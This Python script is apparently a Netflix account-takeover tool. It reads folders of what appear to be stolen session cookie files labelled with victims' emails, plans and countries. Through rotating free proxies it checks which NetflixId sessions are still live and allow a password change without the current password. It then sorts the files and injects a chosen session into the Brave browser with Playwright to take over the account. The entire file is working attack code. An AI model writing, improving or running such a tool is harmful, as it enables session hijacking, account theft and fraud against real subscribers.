#!/usr/bin/env python3
import os, sys, glob, shutil, json, time, requests
from colorama import init, Fore, Style

init(autoreset=True)

COOKIES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'results-password')
OUTPUT_FILE = os.path.expanduser('~/netflix_current.txt')

BANNER = '''
 ███▄    █   █████▒██▓███   ██▓    ▄▄▄     ▓██   ██▓
 ██ ▀█   █ ▓██   ▒▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
▓██  ▀█ ██▒▒████ ░▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
▓██▒  ▐▌██▒░▓█▒  ░▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
▒██░   ▓██░░▒█░   ▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
░ ▒░   ▒ ▒  ▒ ░   ▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒
░ ░░   ░ ▒░ ░     ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░
   ░   ░ ░  ░ ░   ░░         ░ ░    ░   ▒   ▒ ▒ ░░
         ░                     ░  ░     ░  ░░ ░
                                            ░ ░
                       Netflix Login'''

HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

PROXY_SOURCES = [
    'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt',
    'https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/http/data.txt',
]


def fetch_free_proxies():
    seen = set()
    proxies = []
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            for line in r.text.strip().splitlines():
                line = line.strip()
                if not line:
                    continue
                p = line.replace('http://', '').replace('https://', '')
                if p not in seen:
                    seen.add(p)
                    proxies.append(f'http://{p}')
        except Exception:
            pass
    return proxies


class ProxyRotator:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.idx = 0

    def next(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx % len(self.proxies)]
        self.idx += 1
        return p


def find_cookies():
    files = []
    for root, dirs, fs in os.walk(COOKIES_DIR):
        if root.endswith('good_cookies'):
            for f in sorted(fs):
                if f.endswith('.txt'):
                    files.append(os.path.join(root, f))
    return files


def parse_meta(path):
    name = os.path.basename(path).replace('.txt', '')
    p = name.split('] [')
    email = p[-1].rstrip(']') if p else '?'
    plan = p[0].lstrip('[') if p else '?'
    country = p[-2] if len(p) >= 2 else '?'
    return email, plan, country


def extract_ids(path):
    nfid = snfid = None
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line.startswith('.netflix.com'):
                parts = [p.strip() for p in line.split('\t')]
                if len(parts) >= 7:
                    if parts[5] == 'NetflixId':
                        nfid = parts[6]
                    elif parts[5] == 'SecureNetflixId':
                        snfid = parts[6]
    return nfid, snfid


def check_cookie(nfid, snfid, proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}
    s.cookies.set('NetflixId', nfid, domain='.netflix.com')
    if snfid:
        s.cookies.set('SecureNetflixId', snfid, domain='.netflix.com')
    try:
        r = s.get('https://www.netflix.com/password', headers=HEADERS, timeout=20)
        if r.status_code != 200 or 'login' in r.url.lower():
            return 'DEAD'
        if 'newPassword' in r.text and 'currentPassword' not in r.text:
            return 'GOOD'
        elif 'newPassword' in r.text and 'currentPassword' in r.text:
            return 'BAD'
        return 'UNKNOWN'
    except:
        return 'ERROR'


def open_brave(cookies):
    import subprocess, time
    from playwright.sync_api import sync_playwright

    DATA_DIR = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser')

    subprocess.run(['pkill', '-x', 'brave'], capture_output=True)
    time.sleep(1)

    with sync_playwright() as p:
        context = p.chromium.launch_persistent_context(
            user_data_dir=DATA_DIR,
            headless=False,
            executable_path='/usr/bin/brave',
            args=['--no-first-run'],
        )
        page = context.new_page()
        page.goto('https://www.netflix.com/')
        page.context.add_cookies(cookies)
        page.goto('https://www.netflix.com/browse')


def build_alive_cookies(path):
    nfid, snfid = extract_ids(path)
    if not nfid:
        return None
    return [
        {'domain': '.netflix.com', 'name': 'NetflixId', 'value': nfid,
         'path': '/', 'secure': True, 'httpOnly': True, 'sameSite': 'Lax'},
        {'domain': '.netflix.com', 'name': 'SecureNetflixId', 'value': snfid or '',
         'path': '/', 'secure': True, 'httpOnly': True, 'sameSite': 'Lax'},
    ]


def main():
    print(BANNER)

    no_proxy = '--no-proxy' in sys.argv

    rotator = ProxyRotator()
    if not no_proxy:
        print(Fore.CYAN + '\n🌐 Fetching free proxies...' + Style.RESET_ALL)
        proxies = fetch_free_proxies()
        if proxies:
            rotator = ProxyRotator(proxies)
            print(Fore.GREEN + f'   ✅ Loaded {len(proxies)} proxies' + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + '   ⚠ No proxies found, using direct IP' + Style.RESET_ALL)

    files = find_cookies()
    if not files:
        print(Fore.RED + '\n  ❌ No good_cookies found.' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n  🔍 Scanning {len(files)} cookies...' + Style.RESET_ALL)
    time.sleep(0.5)

    alive = []
    proxy_switches = 0
    for i, fpath in enumerate(files):
        email, plan, country = parse_meta(fpath)
        nfid, snfid = extract_ids(fpath)
        label = f'{email or os.path.basename(fpath):40s} | {plan:15s} | {country}'

        proxy = rotator.next()
        max_retries = 3 if proxy else 1
        status = 'ERROR'
        for attempt in range(max_retries):
            status = check_cookie(nfid, snfid, proxy) if nfid else 'NO_ID'
            if status != 'ERROR':
                break
            proxy = rotator.next()
            proxy_switches += 1

        if status == 'GOOD':
            alive.append(fpath)
            print(Fore.GREEN + f'  ✅ #{len(alive):>2} GOOD  | {label}' + Style.RESET_ALL, flush=True)
        elif status == 'BAD':
            bad_dir = os.path.join(os.path.dirname(fpath).replace('good_cookies', 'bad_cookies'))
            os.makedirs(bad_dir, exist_ok=True)
            shutil.move(fpath, os.path.join(bad_dir, os.path.basename(fpath)))
            print(Fore.RED + f'     BAD   | {label}  🗑 moved' + Style.RESET_ALL)
        elif status == 'DEAD':
            dead_dir = os.path.join(os.path.dirname(fpath).replace('good_cookies', 'dead_cookies'))
            os.makedirs(dead_dir, exist_ok=True)
            shutil.move(fpath, os.path.join(dead_dir, os.path.basename(fpath)))
            print(Fore.YELLOW + f'     DEAD  | {label}  🗑 moved' + Style.RESET_ALL)
        else:
            print(Fore.RED + f'     {status:5s} | {label}' + Style.RESET_ALL)

        time.sleep(0.15)

    if not alive:
        print(Fore.RED + '\n  ❌ No alive accounts found.' + Style.RESET_ALL)
        sys.exit(1)

    print(Fore.CYAN + f'\n  ✅ {len(alive)} alive accounts' + Style.RESET_ALL)
    if rotator.proxies:
        print(Fore.CYAN + f'  🌐 {len(rotator.proxies)} proxies loaded  🔄 {proxy_switches} switches' + Style.RESET_ALL)
    print()

    for i, f in enumerate(alive):
        email, plan, country = parse_meta(f)
        print(Fore.WHITE + f'  {i+1:>2}. {email:35s} | {plan:15s} | {country}' + Style.RESET_ALL)

    open_flag = '--open' in sys.argv or '-o' in sys.argv
    idx = -1

    for arg in sys.argv[1:]:
        if arg in ('--open', '-o'):
            continue
        try:
            idx = int(arg) - 1
        except:
            pass

    if idx < 0:
        print()
        choice = input('  Select account: ').strip()
        try:
            idx = int(choice) - 1
        except:
            pass

    if idx < 0 or idx >= len(alive):
        print(Fore.RED + '  ❌ Invalid selection' + Style.RESET_ALL)
        sys.exit(1)

    selected = alive[idx]
    email, plan, country = parse_meta(selected)
    shutil.copy2(selected, OUTPUT_FILE)

    print(f'\n  ✅ Cookie saved → {OUTPUT_FILE}')
    nfid, snfid = extract_ids(selected)
    if nfid:
        print(f'  📋 NetflixId:       {nfid[:60]}...')
    if snfid:
        print(f'  📋 SecureNetflixId: {snfid[:60]}...')
    print(f'\n     Account: {email}')
    print(f'     Plan: {plan} | Country: {country}')

    if open_flag:
        print('\n  🚀 Opening Brave...')
        cookies = build_alive_cookies(selected)
        if cookies:
            open_brave(cookies)
    else:
        print('\n  💡 Use --open N to launch in Brave automatically')


if __name__ == '__main__':
    main()
